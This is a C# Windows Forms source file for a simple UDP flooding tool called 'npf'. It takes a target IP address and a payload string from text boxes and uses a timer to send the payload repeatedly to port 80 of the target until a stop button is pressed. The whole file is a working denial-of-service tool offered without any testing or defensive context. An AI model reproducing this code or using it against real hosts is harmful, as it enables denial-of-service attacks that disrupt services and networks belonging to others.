using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace npf
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Flooding started");
            floodTimer.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Flooding stopped");
            floodTimer.Stop();
        }

        private void floodTimer_Tick(object sender, EventArgs e)
        {
            flood();
        }
        private void flood()
        {
            IPAddress ip;
            UdpClient client = new UdpClient();
            string ipaddr = IPText.Text;
            bool ValidateIP = IPAddress.TryParse(ipaddr, out ip);
            if (ValidateIP)
            {
                try
                {
                    client.Connect(ipaddr, 80);
                    byte[] sendBytes = Encoding.ASCII.GetBytes(DataText.Text);
                    client.Send(sendBytes, sendBytes.Length);
                    client.AllowNatTraversal(true);
                    client.DontFragment = true;
                }
                catch
                {
                    const string errorMessage = "There was an error with npf.";
                    const string errorCaption = "Ensure that you have an internet connection and that all the data is entered correctly.";
                    MessageBox.Show(errorMessage, errorCaption,
                        MessageBoxButtons.OK);
                }
            }
            else
            {
                MessageBox.Show("The IP Address is invalid, please double check it is entered correctly.");
            }
        }
    }
}
